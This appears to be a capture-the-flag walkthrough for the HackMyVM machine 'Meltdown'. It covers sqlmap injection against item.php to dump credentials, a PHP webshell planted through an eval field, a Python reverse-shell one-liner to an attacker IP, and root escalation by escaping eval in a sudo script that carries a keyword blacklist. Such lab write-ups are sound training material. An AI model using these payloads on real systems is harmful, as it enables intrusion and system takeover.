# Meltdown: A HackMyVM Machine

## Enumeration

- Port 22 and 80 are open.

### Web enumeration

- The machine is running a PHP website, with has a login page, and an item page.
- The item page is located at `/item.php` and takes an id parameter. When none are passed through it gives an error. 

```html
<br />
<b>Warning</b>:  Undefined array key "id" in <b>/var/www/html/item.php</b> on line <b>8</b><br />
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1 in /var/www/html/item.php:9
Stack trace:
#0 /var/www/html/item.php(9): mysqli-&gt;query()
#1 {main}
  thrown in <b>/var/www/html/item.php</b> on line <b>9</b><br />
```

- This told me that there is a possible sql injection here. So let's use sqlmap

```bash
sqlmap -u http://<target_ip>/item.php?id=1
```

- Use [this cheatsheet](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap/index.html) to enumerate all the databases and tables.

```bash
sqlmap -u http://<target_ip>/item.php?id=1 -D target -T users --dump
```

- This gets us the credentials to log in to the website `rin:rin123`.
- Once we log in we can see a page where an item can be updated. It's current value appears to be a PHP command.
- If we try entering normal plaintext, we see that the items page errors out again, and we can see that it is using eval to evaluate the expression. 
- So we will insert a PHP webshell into the items page and use it to gain RCE.
- In the textarea on the rin_profile.php page enter this value:

```php
system($_GET['cmd']);
```

- To execute commands on the page visit `/item.php?id=1&cms=ls`.
- curl and wget are not installed on the system, but python3 is, so use this command to spawn a reverse shell.

```bash
export RHOST="<attacker_ip>";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

## User flag 

- The password to the rin user can be found in /opt/passwd.txt
- Authenticate as the rin user via ssh and get the flag from user.txt

## Privilege Escalation

- On running `sudo -l` we get this:

```bash
Matching Defaults entries for rin on meltdown:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rin may run the following commands on meltdown:
    (root) NOPASSWD: /opt/repeater.sh
```

- The code to `/opt/repeater.sh` is given below:

```bash
#!/bin/bash

main() {
    local user_input="$1"
    
    if echo "$user_input" | grep -qE '[;&|`$\\]'; then
        echo "错误：输入包含非法字符"
        return 1
    fi
    
    if echo "$user_input" | grep -qiE '(cat|ls|echo|rm|mv|cp|chmod)'; then
        echo "错误：输入包含危险关键字"
        return 1
    fi
    
   
    if echo "$user_input" | grep -qE '[[:space:]]'; then
        if ! echo "$user_input" | grep -qE '^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$'; then
            echo "错误：空格使用受限"
            return 1
        fi
    fi
    
   
    echo "处理结果: $user_input"
    
   
    local sanitized_input=$(echo "$user_input" | tr -d '\n\r')
    eval "output=\"$sanitized_input\""
    echo "最终输出: $output"
}

if [ $# -ne 1 ]; then
    echo "用法: $0 <输入内容>"
    exit 1
fi

main "$1"
```

- This part took me the most time to figure out. Basically, what we need to do is abuse the eval statement using spaces and quotes because those are not blacklisted.

```bash
sudo /opt/repeater.sh '"
 bash
"'
```

- So far this seems to be the only way to gain RCE and get a root shell.
- This works because the eval statement can be escaped using the `"` symbol. So we first escape the eval, then send our command in a newline (with a space as spaces are stripped in the script) and then close the double and single quote to prevent any syntax errors. 
- Execute this script with `bash -x /opt/repeater.sh` to see the full flow of execution.


Happy Hacking :)
